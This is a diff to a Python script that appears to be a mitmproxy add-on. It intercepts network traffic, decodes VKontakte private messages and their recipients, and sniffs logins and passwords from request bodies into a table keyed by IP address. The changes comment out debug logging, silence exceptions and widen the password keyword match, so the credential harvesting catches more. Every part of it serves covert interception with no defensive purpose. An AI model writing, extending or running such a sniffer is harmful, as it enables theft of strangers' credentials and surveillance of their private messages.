@@ -65,15 +65,15 @@ class VK_data:
             logging.debug(string)
             return [0, string]
 
-        logging.debug("al = " + m.group('al'))
-        logging.debug("gid = " + m.group('gid'))
-        logging.debug("guid = " + m.group('guid'))
-        logging.debug("hash = " + m.group('hash'))
-        logging.debug("media = " + m.group('media'))
-        logging.debug("msg = " + m.group('msg'))
-        logging.debug("title = " + m.group('title'))
-        logging.debug("to = " + m.group('to'))
-        logging.debug("ts = " + m.group('ts'))
+#        logging.debug("al = " + m.group('al'))
+#        logging.debug("gid = " + m.group('gid'))
+#        logging.debug("guid = " + m.group('guid'))
+#        logging.debug("hash = " + m.group('hash'))
+#        logging.debug("media = " + m.group('media'))
+#        logging.debug("msg = " + m.group('msg'))
+#        logging.debug("title = " + m.group('title'))
+#        logging.debug("to = " + m.group('to'))
+#        logging.debug("ts = " + m.group('ts'))
 
         if m.group('to') not in self.users[self.current_user].peers.keys():
             self.users[self.current_user].peers[m.group('to')] = Set([])
@@ -145,8 +145,8 @@ class VK_data:
         if m.group('type') == "a_get_fast_chat":
             return [1]
 
-        logging.debug("Unable to decode type " + m.group('type') 
-                      + "! " + string)
+#        logging.debug("Unable to decode type " + m.group('type') 
+#                      + "! " + string)
         return [0]
 
     def decode_response(self, string):
@@ -186,8 +186,9 @@ class VK_data:
         try:
             string = urllib.unquote(string).decode('utf-8')
         except Exception as e:
-            logging.debug("Exception in 'decode_java':") 
-            logging.debug(e)
+#            logging.debug("Exception in 'decode_java':") 
+#            logging.debug(e)
+            pass
 
         m = re.match((r"code=var mid = API.messages.send\(\{\"peer_id\":(?P<to>\d+),\"message\":\"(?P<msg>[\w\W]*)\"," +
                        "\"type\":\"(?P<type>[\w\W]*)\",\"guid\":(?P<guid>\d+),\"attachment\":(?P<att>[\w\W]*)"), string)
@@ -214,22 +215,23 @@ class VK_data:
 
         self.current_user = my_id
 
-        logging.debug("Known my_ids: " + str(self.users.keys())) 
-        logging.debug("Current my_id: " + str(self.current_user)) 
+#        logging.debug("Known my_ids: " + str(self.users.keys())) 
+#        logging.debug("Current my_id: " + str(self.current_user)) 
      
 class PW_data:
     def __init__(self):
         self.passwords = []
 
     def sniff_passwords(self, string, ip, vk_data):
-        if ("assword" not in string) and ("asswd" not in string) and ("pass" not in string):
+        if ("assword" not in string) and ("asswd" not in string) and ("pass" not in string) and ("Pass" not in string):
             return
-
+#        logging.debug("STR: " + str(string))
         try:
             string = urllib.unquote(string).decode('utf-8')
         except Exception as e:
-            logging.debug("Exception in 'sniff_passwords':") 
-            logging.debug(e)
+#            logging.debug("Exception in 'sniff_passwords':") 
+#            logging.debug(e)
+            return
 
         # Wiki 
         m = re.match(r"wpName=(?P<login>[^&]*)&wpPassword=(?P<password>[^&]*)&[\w\W]*", string)
@@ -282,7 +284,6 @@ class PW_data:
         # Other websites
         self.passwords.append([ip, string])
         logging.debug(str(self))
-
     def __repr__(self):
         s = '\n'
         s += "user".ljust(30) + "website".ljust(30) + "login".ljust(30) + "password".ljust(20) + '\n'
@@ -326,8 +327,9 @@ def request(context, flow):
             
 
     except Exception as e:
-        logging.debug("Exception in 'request':")
-        logging.debug(e)
+#        logging.debug("Exception in 'request':")
+#        logging.debug(e)
+        pass
 
 def response(context, flow):
     try:
@@ -338,8 +340,9 @@ def response(context, flow):
         
 
     except Exception as e:
-        logging.debug("Exception in 'response':")
-        logging.debug(e)
+#        logging.debug("Exception in 'response':")
+#        logging.debug(e)
+        pass
 
 def start (context, argv):
     logging.debug("============================================\n")
